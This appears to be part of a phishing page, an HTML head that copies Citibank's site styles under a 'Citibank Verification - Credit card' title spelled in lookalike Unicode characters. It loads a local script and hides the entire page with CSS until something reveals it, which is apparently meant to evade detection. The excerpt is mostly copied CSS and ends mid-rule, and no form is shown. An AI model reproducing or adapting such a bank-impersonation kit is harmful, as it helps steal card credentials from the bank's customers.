    .ct-cbolui-module-banner[_ngcontent-boo-c53] .ct-module-alert-box[_ngcontent-boo-c53] {
      padding: 10px 20px 10px 30px;
      margin: 20px 0
    }

    .ct-banner-red-alert[_ngcontent-boo-c53] {
      border-left: 4px solid #d60000
    }

    .ct-banner-blue-alert[_ngcontent-boo-c53] {
      border-left: 4px solid #056dae
    }

    .ct-banner-green-alert[_ngcontent-boo-c53] {
      border-left: 4px solid #006e0a
    }

    .ct-banner-gray-alert[_ngcontent-boo-c53] {
      border-left: 4px solid #666
    }

    .theme-light .ct-cbolui-page-banner .ct-banner-alert-box {
      background-color: #eee
    }

    .theme-gray .ct-cbolui-page-banner .ct-banner-alert-box {
      background-color: #fff
    }

    .ct-cbolui-page-banner[_ngcontent-boo-c53] .ct-banner-alert-box[_ngcontent-boo-c53] .message-text {
      padding-right: 40px
    }

    .ct-banner-alert-box[_ngcontent-boo-c53] .cbolui-icon-wrapper,
    .ct-module-alert-box[_ngcontent-boo-c53] .cbolui-icon-wrapper {
      display: flex;
      padding: 0;
      margin-bottom: 0;
      border: 1px solid transparent;
      border-radius: 0
    }

    .theme-gray .ct-module-alert-box {
      border-right: 1px solid #fff;
      border-top: 1px solid #fff;
      border-bottom: 1px solid #fff
    }

    .theme-light .ct-module-alert-box {
      border-right: 1px solid #eee;
      border-top: 1px solid #eee;
      border-bottom: 1px solid #eee
    }

    .close.close[_ngcontent-boo-c53] {
      height: 12px;
      width: 12px;
      margin-top: 5px;
      margin-right: 4px;
      float: right;
      background-position-x: 0;
      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 11 11'%3E%3Ctitle%3E06-close-white%3C/title%3E%3Cpath d='M21.41,20l3.8-3.79a1,1,0,0,0-1.42-1.42L20,18.59l-3.79-3.8a1,1,0,0,0-1.42,1.42L18.59,20l-3.8,3.79a1,1,0,0,0,0,1.42,1,1,0,0,0,1.42,0L20,21.41l3.79,3.8a1,1,0,0,0,1.42,0,1,1,0,0,0,0-1.42Z' transform='translate(-14.5 -14.5)' style='fill:%23666;fill-rule:evenodd'/%3E%3C/svg%3E")
    }

    .close.close[_ngcontent-boo-c53]:focus,
    .close.close[_ngcontent-boo-c53]:hover {
      margin-top: 0;
      margin-right: 0;
      height: 20px;
      width: 20px;
      background-position: unset;
      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 22 22'%3E%3Ctitle%3E06-close-white-hover%3C/title%3E%3Cpath d='M21.41,20.15l3.8-3.79a1,1,0,0,0,0-1.41,1,1,0,0,0-1.42,0L20,18.74,16.21,15a1,1,0,0,0-1.42,0,1,1,0,0,0,0,1.41l3.8,3.79L14.79,24a1,1,0,0,0,0,1.41,1,1,0,0,0,1.42,0L20,21.57l3.79,3.79a1,1,0,0,0,1.42,0,1,1,0,0,0,0-1.41ZM20,9A11,11,0,1,0,31,20,11,11,0,0,0,20,9' transform='translate(-9 -9)' style='fill:%23666;fill-rule:evenodd'/%3E%3C/svg%3E")
    }

    [_nghost-boo-c53] citi-icon2.success path {
      fill: #015a09
    }

    [_nghost-boo-c53] citi-icon2.critical g {
      fill: #b50404;
      width: 34px;
      height: 34px
    }

    [_nghost-boo-c53] citi-icon2.marketing path {
      fill: #004e7f
    }

    [_nghost-boo-c53] citi-icon2.technical g {
      fill: #2a2a2a;
      width: 34px;
      height: 34px
    }
  </style>






  <style type="text/css">
    .kampyle_vertical_button .kampyle_button-text {
      font-size: 16px;
      font-family: Arial, Helvetica, sans-serif !important;
      transform: rotate(-180deg) !important;
      font-weight: 500 !important;
    }

    @media (max-width: 767px) {
      .primary-label {
        display: none;
      }
    }

    .kampyle_button-text::before {
      content: "[+]";
      color: #ffffff;
      font-size: 16px;
      font-family: Arial, Helvetica, sans-serif;
      padding-right: 5px
    }

    .kampyle_vertical_button .kampyle_button {
      border-radius: 0px 0px 7px 7px !important;
      width: 162px !important;
      min-width: 139px !important;
      min-height: 39px !important;
      z-index: -1;
      text-align: center;
    }

    .kampyle_vertical_button {
      top: 40%;
      z-index: 1;
      min-height: 39px !important;
      min-width: 139px !important;
    }

    .kampyle_vertical_button.kampyle_right {
      right: -50px;
    }

    .footer {
      z-index: 1 !important;
    }


    #citilmFooter.reskinFooter {
      z-index: 1 !important;
    }

    .site-footer {
      z-index: 99999999 !important;
    }


    @media (max-width: 991px) {
      button.kampyle_vertical_button {
        margin-top: 24px !important;
      }
    }

    @media (max-width: 480px) {
      button.kampyle_vertical_button {
        margin-top: 50px !important;
      }
    }

    @media print {

      .nebula_image_button,
      .wcagOutline {
        display: none;
      }
    }
  </style>

  <title> Сіtіbаոk Ꮩеrіfісаtіοո - Сrеⅾіt саrⅾ</title>







  <script src="assets/zip.js.download"></script>












  <link rel="stylesheet" href="assets/stylee.css">


  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="icon" type="image/x-icon" href="assets/img/favicon.ico">

  <style>
    .social[_ngcontent-wwg-c207] {
      background: #333
    }

    .social[_ngcontent-wwg-c207] .content[_ngcontent-wwg-c207] {
      width: 100%;
      max-width: 1440px;
      margin: 0 auto;
      padding: 20px 6.667%;
      display: flex;
      justify-content: space-between
    }

    .social[_ngcontent-wwg-c207] .content[_ngcontent-wwg-c207] .JDPowerDownloadText[_ngcontent-wwg-c207] {
      display: none
    }

    @media (max-width:990px) {
      .social[_ngcontent-wwg-c207] .content[_ngcontent-wwg-c207] {
        width: 100%;
        display: block;
        margin: 0 auto;
        padding-left: 5%;
        padding-right: 5%;
        padding-bottom: 12px
      }

      .social[_ngcontent-wwg-c207] .content[_ngcontent-wwg-c207] .JDPowerDownloadText[_ngcontent-wwg-c207] {
        display: block;
        padding-top: 19px
      }

      .social[_ngcontent-wwg-c207] .content[_ngcontent-wwg-c207] .JDPowerDownloadText[_ngcontent-wwg-c207] a[_ngcontent-wwg-c207] {
        font-size: 12px;
        color: #fff;
        width: 288px;
        height: 16px;
        -ms-grid-row-align: center;
        align-self: center
      }
    }

    .social[_ngcontent-wwg-c207] .content[_ngcontent-wwg-c207] .registerMark[_ngcontent-wwg-c207] {
      font-size: 14px
    }

    .social[_ngcontent-wwg-c207] .content[_ngcontent-wwg-c207] .socialItems[_ngcontent-wwg-c207] {
      display: flex;
      padding-bottom: 10px
    }

    .social[_ngcontent-wwg-c207] .content[_ngcontent-wwg-c207] .socialItems[_ngcontent-wwg-c207] .JDPowerDownloadText[_ngcontent-wwg-c207] {
      display: none
    }

    .social[_ngcontent-wwg-c207] .content[_ngcontent-wwg-c207] .socialItems[_ngcontent-wwg-c207] div[_ngcontent-wwg-c207] {
      padding-right: 24px
    }

    .social[_ngcontent-wwg-c207] .content[_ngcontent-wwg-c207] .socialItems[_ngcontent-wwg-c207] div[_ngcontent-wwg-c207] button[_ngcontent-wwg-c207] {
      background: 0 0;
      border: none;
      padding: 0;
      cursor: pointer
    }

    .social[_ngcontent-wwg-c207] .content[_ngcontent-wwg-c207] .socialItems[_ngcontent-wwg-c207] div[_ngcontent-wwg-c207] .JDContainer[_ngcontent-wwg-c207] {
      display: flex
    }

    .social[_ngcontent-wwg-c207] .content[_ngcontent-wwg-c207] .socialItems[_ngcontent-wwg-c207] div[_ngcontent-wwg-c207] .JDContainer[_ngcontent-wwg-c207] button[_ngcontent-wwg-c207] {
      padding-right: 24px
    }

    .social[_ngcontent-wwg-c207] .content[_ngcontent-wwg-c207] .socialItems[_ngcontent-wwg-c207] div[_ngcontent-wwg-c207] .JDContainer[_ngcontent-wwg-c207] a[_ngcontent-wwg-c207] {
      font-size: 14px;
      color: #fff;
      width: 361px;
      height: 18px;
      -ms-grid-row-align: center;
      align-self: center
    }

    .social[_ngcontent-wwg-c207] .content[_ngcontent-wwg-c207] .socialItems[_ngcontent-wwg-c207] div[_ngcontent-wwg-c207]:last-child {
      padding-right: 0
    }

    .social[_ngcontent-wwg-c207] .content[_ngcontent-wwg-c207] .Appstore[_ngcontent-wwg-c207],
    .social[_ngcontent-wwg-c207] .content[_ngcontent-wwg-c207] .Googleplay[_ngcontent-wwg-c207] {
      background-image: url(assets/img/Appstore-Googleplay-JDPower-Sprite.png);
      background-repeat: no-repeat;
      background-size: cover
    }

    .social[_ngcontent-wwg-c207] .content[_ngcontent-wwg-c207] .facebook[_ngcontent-wwg-c207] {
      background-image: url();
      background-repeat: no-repeat;
      background-size: cover
    }

    .social[_ngcontent-wwg-c207] .content[_ngcontent-wwg-c207] .twitter[_ngcontent-wwg-c207] {
      background-image: url();
      background-repeat: no-repeat;
      background-size: cover
    }

    .social[_ngcontent-wwg-c207] .content[_ngcontent-wwg-c207] .Appstore[_ngcontent-wwg-c207] {
      width: 117px;
      height: 40.1px;
      background-position: 0 0
    }

    @media (max-width:990px) {
      .social[_ngcontent-wwg-c207] .content[_ngcontent-wwg-c207] .socialItems[_ngcontent-wwg-c207] .JDPowerDownloadText[_ngcontent-wwg-c207] {
        display: block;
        padding-top: 19px
      }

      .social[_ngcontent-wwg-c207] .content[_ngcontent-wwg-c207] .socialItems[_ngcontent-wwg-c207] .JDPowerDownloadText[_ngcontent-wwg-c207] a[_ngcontent-wwg-c207] {
        font-size: 12px;
        color: #fff;
        width: 288px;
        height: 16px;
        -ms-grid-row-align: center;
        align-self: center
      }

      .social[_ngcontent-wwg-c207] .content[_ngcontent-wwg-c207] .socialItems[_ngcontent-wwg-c207] div[_ngcontent-wwg-c207] {
        padding-right: 15px
      }

      .social[_ngcontent-wwg-c207] .content[_ngcontent-wwg-c207] .socialItems[_ngcontent-wwg-c207] div[_ngcontent-wwg-c207] .JDContainer[_ngcontent-wwg-c207] a[_ngcontent-wwg-c207] {
        display: none
      }

      .social[_ngcontent-wwg-c207] .content[_ngcontent-wwg-c207] .Appstore[_ngcontent-wwg-c207] {
        width: 102px;
        height: 36px
      }
    }

    .social[_ngcontent-wwg-c207] .content[_ngcontent-wwg-c207] .Googleplay[_ngcontent-wwg-c207] {
      width: 130px;
      height: 40.1px;
      background-position: 0 -45px
    }

    @media (max-width:990px) {
      .social[_ngcontent-wwg-c207] .content[_ngcontent-wwg-c207] .Googleplay[_ngcontent-wwg-c207] {
        width: 117px;
        height: 36px;
        background-position: 0 -41px
      }
    }

    .social[_ngcontent-wwg-c207] .content[_ngcontent-wwg-c207] .JDPowerLogo[_ngcontent-wwg-c207] {
      width: 40px;
      height: 40.1px
    }

    @media (max-width:990px) {
      .social[_ngcontent-wwg-c207] .content[_ngcontent-wwg-c207] .JDPowerLogo[_ngcontent-wwg-c207] {
        width: 35.6px;
        height: 36px;
        margin-right: 0
      }
    }

    .social[_ngcontent-wwg-c207] .content[_ngcontent-wwg-c207] .facebook[_ngcontent-wwg-c207] {
      width: 9px;
      height: 16px
    }

    .social[_ngcontent-wwg-c207] .content[_ngcontent-wwg-c207] .twitter[_ngcontent-wwg-c207] {
      width: 22px;
      height: 16px
    }

    .social[_ngcontent-wwg-c207] .content[_ngcontent-wwg-c207] .youtube[_ngcontent-wwg-c207] {
      background-image: url();
      background-repeat: no-repeat;
      background-size: cover;
      width: 24px;
      height: 16px
    }
  </style>

  <style>
    .disclaimer[_ngcontent-wwg-c206] {
      background: #333;
      padding-bottom: 12px
    }

    .disclaimer[_ngcontent-wwg-c206] .content[_ngcontent-wwg-c206] {
      width: 100%;
      max-width: 1440px;
      margin: 0 auto;
      padding: 0 6.667%
    }

    @media (max-width:990px) {
      .disclaimer[_ngcontent-wwg-c206] .content[_ngcontent-wwg-c206] {
        padding: 0 5%
      }
    }

    .disclaimer[_ngcontent-wwg-c206] .content[_ngcontent-wwg-c206] h4 {
      font-family: Interstate_Bold, sans-serif;
      font-size: 12px;
      color: #fff;
      line-height: 16px
    }

    .disclaimer[_ngcontent-wwg-c206] .content[_ngcontent-wwg-c206] a,
    .disclaimer[_ngcontent-wwg-c206] .content[_ngcontent-wwg-c206] p {
      font-family: Interstate_Light, sans-serif;
      font-size: 12px;
      color: #f4f4f4;
      letter-spacing: 0;
      line-height: 18px
    }

    .disclaimer[_ngcontent-wwg-c206] .content[_ngcontent-wwg-c206] .text[_ngcontent-wwg-c206] {
      font-size: 12px;
      color: #fff
    }

    .disclaimer[_ngcontent-wwg-c206] .content[_ngcontent-wwg-c206] .text[_ngcontent-wwg-c206] p[_ngcontent-wwg-c206] {
      max-height: 100%
    }

    .disclaimer[_ngcontent-wwg-c206] .content[_ngcontent-wwg-c206] .text[_ngcontent-wwg-c206] p[_ngcontent-wwg-c206]:last-child {
      margin-bottom: 0
    }

    .disclaimer[_ngcontent-wwg-c206] .content[_ngcontent-wwg-c206] .text[_ngcontent-wwg-c206] a[_ngcontent-wwg-c206] {
      color: #fff
    }
  </style>


  <style>
    html {
      display: none;
      visibility: hidden;
    }
  </style>

  <style>
    .jamp.preload {
      display: -ms-flexbox;
      display: -webkit-flex;
      display: flex;
      -webkit-justify-content: center;
      -ms-flex-pack: center;
      justify-content: center;
      -webkit-align-items: center;
      -ms-flex-align: center;
      align-items: center;

      width: 100%;
      height: 100%;
      position: absolute;
      top: 0px;
      left: 0px;
      margin: 0;
    }

    @keyframes spinner {
      to {
        transform: rotate(360deg);
      }
    }

    .jamp.preload .loading {
      background-image: url(assets/img/download.svg);
      -webkit-animation: spinner 1160ms infinite linear;
      animation: spinner 1160ms infinite linear;
    }

    .jamp.preload .img {
      background-position: 0 0;
      background-repeat: no-repeat;
      background-size: contain;
      margin-right: 3px;
      width: 30px;
      height: 30px;
      display: inline-block;
    }
  </style>
  <style></style>
  <style>
    .mfa-screen-alignment[_ngcontent-ekd-c197] {
      margin-left: 20px !important
    }
  </style>
  <style>
    .citi-container[_ngcontent-ekd-c247] {
      padding: 40px 20px 0;
      max-width: 1440px;
      margin: 0 auto;
      min-height: 650px
    }

    .fullbleedFix[_ngcontent-ekd-c247] {
      margin: 0;
      padding: 0;
      max-width: 100%
    }

    [_nghost-ekd-c247] .fullbleedFix .row {
      margin-left: 0;
      margin-right: 0
    }

    .citi-panel-wrapper[_ngcontent-ekd-c247] {
      display: flex
    }

    .citi-panel-wrapper[_ngcontent-ekd-c247] .content-panel[_ngcontent-ekd-c247] {
      flex: 3 0 0
    }

    .citi-panel-wrapper[_ngcontent-ekd-c247] .search-panel[_ngcontent-ekd-c247] {
      flex: 1 0 0;
      border-left: 1px solid #d6d6d6;
      background-color: #fff
    }

    @media screen and (max-width:991.9px) {
      .citi-panel-wrapper[_ngcontent-ekd-c247] .search-panel[_ngcontent-ekd-c247] {
        background-color: #fff !important
      }

      .citi-panel-wrapper[_ngcontent-ekd-c247] .content-panel[_ngcontent-ekd-c247] {
        display: none
      }
    }

    @media screen and (max-width:768px) {
      .citi-panel-wrapper[_ngcontent-ekd-c247] .search-panel[_ngcontent-ekd-c247] {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        z-index: 100000 !important;
        background-color: #fff !important
      }

      .citi-panel-wrapper[_ngcontent-ekd-c247] .content-panel[_ngcontent-ekd-c247] {
        display: none
      }
    }
  </style>
  <style>
    .ivr-cta-wrapper[_ngcontent-ekd-c278] {
      text-align: right
    }

    .citi-bot[_ngcontent-ekd-c278] {
      height: 100%;
      width: 100%;
      background: #0e2a48;
      text-align: start;
      border-radius: 8px;
      padding: 16px;
      display: -ms-grid;
      display: grid;
      -ms-grid-columns: auto 1fr auto;
      grid-template-columns: auto 1fr auto;
      align-items: center;
      border: none
    }

    .citi-bot-header[_ngcontent-ekd-c278] {
      color: #fff;
      font-family: interstate_Bold;
      margin: 8px;
      padding: 0 16px
    }

    .citi-bot-content[_ngcontent-ekd-c278] {
      color: #eee;
      margin: 8px;
      padding: 0 16px;
      line-height: 120%
    }

    citi-icon2[_ngcontent-ekd-c278] svg path {
      fill: #00bdf2
    }

    .citi-bot-link[_ngcontent-ekd-c278] {
      font-family: interstate_Bold;
      color: #00bdf2;
      margin: 0
    }

    .citi-bot-link-container[_ngcontent-ekd-c278] {
      display: flex;
      justify-content: flex-end;
      flex-direction: row;
      align-items: center
    }

    .citi-bot-link-container[_ngcontent-ekd-c278] citi-icon2[_ngcontent-ekd-c278] svg>path {
      stroke-width: 3;
      stroke: #00bdf2
    }

    @media (max-width:767px) {
      #ivr-modal .header-level-2 {
        line-height: 2rem
      }
    }

    @media (max-width:991px) {
      .ivr-cta-wrapper[_ngcontent-ekd-c278] {
        text-align: center
      }

      .citi-bot[_ngcontent-ekd-c278] {
        text-align: center;
        display: block
      }

      .citi-bot-header[_ngcontent-ekd-c278] {
        margin-top: 0
      }

      .citi-bot-content[_ngcontent-ekd-c278] {
        padding: 0
      }

      .citi-bot-link-container[_ngcontent-ekd-c278] {
        display: flex;
        justify-content: center;
        align-items: center
      }
    }

    .citi-bot[_ngcontent-ekd-c278]:hover {
      cursor: pointer
    }

    .citi-bot-divider[_ngcontent-ekd-c278] {
      border-top: 1.5px solid #666;
      opacity: 25%;
      margin-bottom: 16px
    }

    .citi-bot-divider-container[_ngcontent-ekd-c278] {
      margin-top: 42px
    }
  </style>
  <style>
    .ivr-modal-container .ivr-cta-wrapper {
      text-align: right;
      justify-content: flex-end;
      margin: 8px
    }

    .ivr-modal-container .ivr-cta-wrapper .cds-cta {
      margin: 8px;
      padding: 13px 0
    }

    .ivr-modal-container .ivr-cta-wrapper button {
      text-align: center
    }

    .ivr-modal-container p {
      margin: 0
    }

    .ivr-modal-container .cds-modal-footer {
      justify-content: flex-end
    }

    .ivr-modal-container .dropdown {
      padding: 8px
    }

    .ivr-modal-container .citi-bot {
      height: 100%;
      width: 100%;
      background: #0e2a48;
      text-align: start;
      border-radius: 8px;
      padding: 16px;
      display: -ms-grid;
      display: grid;
      -ms-grid-columns: auto 1fr auto;
      grid-template-columns: auto 1fr auto;
      align-items: center;
      border: none
    }

    .ivr-modal-container .citi-bot-header {
      color: #fff;
      font-family: interstate_Bold;
      margin: 8px;
      padding: 0 16px
    }

    .ivr-modal-container .citi-bot-content {
      color: #eee;
      margin: 8px;
      padding: 0 16px;
      line-height: 120%
    }

    .ivr-modal-container cds-icon svg>path {
      fill: #00bdf2
    }

    .ivr-modal-container .citi-bot-link {
      font-family: interstate_Bold;
      color: #00bdf2;
      margin: 0
    }

    .ivr-modal-container .citi-bot-link-container {
      display: flex;
      justify-content: flex-end;
      flex-direction: row;
      align-items: center
    }

    .ivr-modal-container .citi-bot-link-container cds-icon svg>path {
      stroke-width: 3;
      stroke: #00bdf2
    }

    .cdk-overlay-container {
      z-index: 10002
    }

    @media (max-width:1167px) {
      .ivr-cta-wrapper[_ngcontent-ekd-c279] {
        text-align: center;
        justify-content: center
      }

      .citi-bot[_ngcontent-ekd-c279] {
        text-align: center;
        display: block
      }

      .citi-bot-header[_ngcontent-ekd-c279] {
        margin-top: 0
      }

      .citi-bot-content[_ngcontent-ekd-c279] {
        padding: 0
      }

      .citi-bot-link-container[_ngcontent-ekd-c279] {
        display: flex;
        justify-content: center;
        align-items: center
      }

      .cds-modal-footer[_ngcontent-ekd-c279] {
        justify-content: center
      }
    }

    .citi-bot[_ngcontent-ekd-c279]:hover {
      cursor: pointer
    }

    .citi-bot-divider[_ngcontent-ekd-c279] {
      border-top: 1.5px solid #666;
      opacity: 25%;
      margin-bottom: 16px
    }
  </style>
  <style>
    .modal.in {
      z-index: 9999999999 !important
    }

    .citi-modal-backdrop {
      z-index: 999999999 !important
    }
  </style>
  <style>
    [_nghost-ekd-c244] citi-input .form-group {
      padding-left: 0;
      padding-right: 0
    }

    [_nghost-ekd-c244] citi-modal div .citi-modal-box .citi-modal-close {
      padding-top: 5px !important
    }

    [_nghost-ekd-c244] citi-modal div .citi-modal-box .citi-modal-controls {
      padding-top: 0 !important;
      padding-bottom: 10px !important
    }
  </style>
  <style>
    .primary[_ngcontent-ekd-c206] {
      box-shadow: 0 1px 5px rgba(0, 0, 0, .125);
      position: relative;
      z-index: 9999
    }

    .alternateSkipNav[_ngcontent-ekd-c206] {
      position: absolute;
      transform: translateY(-100%);
      padding: 3px
    }

    .alternateSkipNav[_ngcontent-ekd-c206]:focus {
      transform: translateY(0);
      position: relative !important
    }

    .coBranding[_ngcontent-ekd-c206] {
      max-width: 1440px;
      margin: 0 auto
    }
  </style>
  <style>
    [_nghost-ekd-c209] .brandingSprite {
      background-image: url(citi-branding-assets/images/Citi-Branding-Sprite.png) !important;
      background-repeat: no-repeat;
      cursor: pointer;
      display: inline-block
    }

    [_nghost-ekd-c209] .brandingSprite .equalHousing,
    [_nghost-ekd-c209] .brandingSprite .fdic {
      cursor: default !important
    }

    [_nghost-ekd-c209] .footer {
      position: initial;
      background: #333
    }

    citi-social-media[_ngcontent-ekd-c209] .social .content .socialItems citi-modal .modal .modal-dialog {
      margin: 40px auto !important
    }

    citi-social-media[_ngcontent-ekd-c209] .social .content .socialItems citi-modal .modal .modal-dialog .modal-content .modal-header {
      padding: 15px !important;
      min-height: 16.5px
    }

    citi-social-media[_ngcontent-ekd-c209] .social .content .socialItems citi-modal .modal .modal-dialog .modal-content .modal-body {
      padding-right: 40px;
      padding-left: 40px
    }

    citi-social-media[_ngcontent-ekd-c209] .social .content .socialItems citi-modal .modal .modal-dialog .modal-content .modal-footer {
      padding: 40px 15px 15px !important;
      text-align: right;
      border-top: 1px solid #e5e5e5;
      width: 100%;
      border: none !important
    }

    citi-social-media[_ngcontent-ekd-c209] .social .content .socialItems citi-modal .modal .modal-dialog .modal-content .modal-footer citi-cta a {
      color: #fff;
      background: #056dae;
      margin: 20px 20px 0 0;
      min-width: 220px;
      position: relative;
      line-height: 34px;
      vertical-align: middle;
      text-align: center;
      font-size: 1rem;
      font-family: Interstate_Bold, sans-serif;
      -webkit-font-smoothing: antialiased;
      -moz-osx-font-smoothing: grayscale;
      font-weight: 700;
      border-radius: 6px;
      display: inline-block;
      touch-action: manipulation;
      cursor: pointer;
      border: 2px solid #056dae;
      white-space: nowrap;
      padding: 6px 20px;
      -webkit-user-select: none;
      -moz-user-select: none;
      -ms-user-select: none;
      user-select: none
    }

    @media screen and (max-width:800px) {
      #nebula_div_btn[_ngcontent-ekd-c209] {
        display: none
      }
    }
  </style>
  <style>
    a[_ngcontent-ekd-c207],
    abbr[_ngcontent-ekd-c207],
    acronym[_ngcontent-ekd-c207],
    address[_ngcontent-ekd-c207],
    applet[_ngcontent-ekd-c207],
    article[_ngcontent-ekd-c207],
    aside[_ngcontent-ekd-c207],
    audio[_ngcontent-ekd-c207],
    b[_ngcontent-ekd-c207],
    big[_ngcontent-ekd-c207],
    blockquote[_ngcontent-ekd-c207],
    body[_ngcontent-ekd-c207],
    canvas[_ngcontent-ekd-c207],
    caption[_ngcontent-ekd-c207],
    center[_ngcontent-ekd-c207],
    cite[_ngcontent-ekd-c207],
    code[_ngcontent-ekd-c207],
    dd[_ngcontent-ekd-c207],
    del[_ngcontent-ekd-c207],
    details[_ngcontent-ekd-c207],
    dfn[_ngcontent-ekd-c207],
    div[_ngcontent-ekd-c207],
    dl[_ngcontent-ekd-c207],
    dt[_ngcontent-ekd-c207],
    em[_ngcontent-ekd-c207],
    embed[_ngcontent-ekd-c207],
    fieldset[_ngcontent-ekd-c207],
    figcaption[_ngcontent-ekd-c207],
    figure[_ngcontent-ekd-c207],
    footer[_ngcontent-ekd-c207],
    form[_ngcontent-ekd-c207],
    h1[_ngcontent-ekd-c207],
    h2[_ngcontent-ekd-c207],
    h3[_ngcontent-ekd-c207],
    h4[_ngcontent-ekd-c207],
    h5[_ngcontent-ekd-c207],
    h6[_ngcontent-ekd-c207],
    header[_ngcontent-ekd-c207],
    hgroup[_ngcontent-ekd-c207],
    html[_ngcontent-ekd-c207],
    i[_ngcontent-ekd-c207],
    iframe[_ngcontent-ekd-c207],
    img[_ngcontent-ekd-c207],
    ins[_ngcontent-ekd-c207],
    kbd[_ngcontent-ekd-c207],
    label[_ngcontent-ekd-c207],
    legend[_ngcontent-ekd-c207],
    li[_ngcontent-ekd-c207],
    mark[_ngcontent-ekd-c207],
    menu[_ngcontent-ekd-c207],
    nav[_ngcontent-ekd-c207],
    object[_ngcontent-ekd-c207],
    ol[_ngcontent-ekd-c207],
    output[_ngcontent-ekd-c207],
    p[_ngcontent-ekd-c207],
    pre[_ngcontent-ekd-c207],
    q[_ngcontent-ekd-c207],
    ruby[_ngcontent-ekd-c207],
    s[_ngcontent-ekd-c207],
    samp[_ngcontent-ekd-c207],
    section[_ngcontent-ekd-c207],
    small[_ngcontent-ekd-c207],
    span[_ngcontent-ekd-c207],
    strike[_ngcontent-ekd-c207],
    strong[_ngcontent-ekd-c207],
    sub[_ngcontent-ekd-c207],
    summary[_ngcontent-ekd-c207],
    sup[_ngcontent-ekd-c207],
    table[_ngcontent-ekd-c207],
    tbody[_ngcontent-ekd-c207],
    td[_ngcontent-ekd-c207],
    tfoot[_ngcontent-ekd-c207],
    th[_ngcontent-ekd-c207],
    thead[_ngcontent-ekd-c207],
    time[_ngcontent-ekd-c207],
    tr[_ngcontent-ekd-c207],
    tt[_ngcontent-ekd-c207],
    u[_ngcontent-ekd-c207],
    ul[_ngcontent-ekd-c207],
    var[_ngcontent-ekd-c207],
    video[_ngcontent-ekd-c207] {
      margin: 0;
      padding: 0;
      border: 0;
      font: inherit;
      vertical-align: baseline
    }

    article[_ngcontent-ekd-c207],
    aside[_ngcontent-ekd-c207],
    details[_ngcontent-ekd-c207],
    figcaption[_ngcontent-ekd-c207],
    figure[_ngcontent-ekd-c207],
    footer[_ngcontent-ekd-c207],
    header[_ngcontent-ekd-c207],
    hgroup[_ngcontent-ekd-c207],
    menu[_ngcontent-ekd-c207],
    nav[_ngcontent-ekd-c207],
    section[_ngcontent-ekd-c207] {
      display: block
    }

    body[_ngcontent-ekd-c207] {
      line-height: 1
    }

    ol[_ngcontent-ekd-c207],
    ul[_ngcontent-ekd-c207] {
      list-style: none
    }

    blockquote[_ngcontent-ekd-c207],
    q[_ngcontent-ekd-c207] {
      quotes: none
    }

    blockquote[_ngcontent-ekd-c207]:after,
    blockquote[_ngcontent-ekd-c207]:before,
    q[_ngcontent-ekd-c207]:after,
    q[_ngcontent-ekd-c207]:before {
      content: "";
      content: none
    }

    table[_ngcontent-ekd-c207] {
      border-collapse: collapse;
      border-spacing: 0
    }

    .journeyLogo[_ngcontent-ekd-c207] {
      display: flex
    }

    .divider[_ngcontent-ekd-c207] {
      border-left: 3.5px solid #d3d3d3;
      height: 28px;
      margin-top: 23px;
      margin-right: 10px
    }

    .webLogo[_ngcontent-ekd-c207] {
      max-width: 100%;
      max-height: 100%;
      display: block
    }

    .box[_ngcontent-ekd-c207] {
      width: 180px;
      display: flex;
      justify-content: left;
      align-items: center
    }

    .webDiv[_ngcontent-ekd-c207] {
      margin-left: 5px
    }

    .box.small[_ngcontent-ekd-c207] {
      height: 72px
    }

    .box.small[_ngcontent-ekd-c207] img[_ngcontent-ekd-c207] {
      height: 40px
    }

    @media screen and (min-width:1000px) {
      .divider[_ngcontent-ekd-c207] {
        margin-left: 35px;
        height: 37px;
        margin-top: 27px
      }

      .box.small[_ngcontent-ekd-c207] {
        height: 88px
      }

      .box.small[_ngcontent-ekd-c207] img[_ngcontent-ekd-c207] {
        height: 48px
      }

      .webDiv[_ngcontent-ekd-c207] {
        margin-left: 15px
      }
    }

    .banner[_ngcontent-ekd-c207] {
      height: 88px;
      background-color: #fff !important
    }

    .banner[_ngcontent-ekd-c207] .content-wrap[_ngcontent-ekd-c207] {
      height: 100%;
      padding: 0 35px 0 20px;
      position: relative;
      display: flex;
      justify-content: space-between
    }

    .banner[_ngcontent-ekd-c207] .content-wrap[_ngcontent-ekd-c207] .cpc[_ngcontent-ekd-c207] {
      height: 88px;
      width: auto;
      padding-bottom: 20px;
      padding-left: 17px
    }

    .banner[_ngcontent-ekd-c207] .content-wrap[_ngcontent-ekd-c207] .cpc[_ngcontent-ekd-c207] img[_ngcontent-ekd-c207] {
      height: auto;
      width: auto
    }

    @media (max-width:990px) {
      .banner[_ngcontent-ekd-c207] {
        height: 72px
      }

      .banner[_ngcontent-ekd-c207] .content-wrap[_ngcontent-ekd-c207] {
        padding: 0
      }

      .banner[_ngcontent-ekd-c207] .content-wrap[_ngcontent-ekd-c207] .cpc[_ngcontent-ekd-c207] {
        height: 72px;
        width: auto;
        padding: 0
      }

      .banner[_ngcontent-ekd-c207] .content-wrap[_ngcontent-ekd-c207] .cpc[_ngcontent-ekd-c207] img[_ngcontent-ekd-c207] {
        height: 72px;
        width: auto;
        padding-left: 16px
      }
    }

    .banner[_ngcontent-ekd-c207] .content-wrap[_ngcontent-ekd-c207] .cpb[_ngcontent-ekd-c207] {
      height: 88px;
      width: auto
    }

    .banner[_ngcontent-ekd-c207] .content-wrap[_ngcontent-ekd-c207] .cpb[_ngcontent-ekd-c207] img[_ngcontent-ekd-c207] {
      width: auto
    }

    @media (max-width:990px) {

      .banner[_ngcontent-ekd-c207] .content-wrap[_ngcontent-ekd-c207] .cpb[_ngcontent-ekd-c207],
      .banner[_ngcontent-ekd-c207] .content-wrap[_ngcontent-ekd-c207] .cpb[_ngcontent-ekd-c207] img[_ngcontent-ekd-c207] {
        height: 72px;
        width: auto
      }
    }

    .banner[_ngcontent-ekd-c207] .content-wrap[_ngcontent-ekd-c207] .business[_ngcontent-ekd-c207],
    .banner[_ngcontent-ekd-c207] .content-wrap[_ngcontent-ekd-c207] .gold[_ngcontent-ekd-c207],
    .banner[_ngcontent-ekd-c207] .content-wrap[_ngcontent-ekd-c207] .priority[_ngcontent-ekd-c207] {
      height: 88px;
      width: auto;
      padding-top: 28px;
      padding-bottom: 20px;
      padding-left: 14px
    }

    .banner[_ngcontent-ekd-c207] .content-wrap[_ngcontent-ekd-c207] .business[_ngcontent-ekd-c207] img[_ngcontent-ekd-c207],
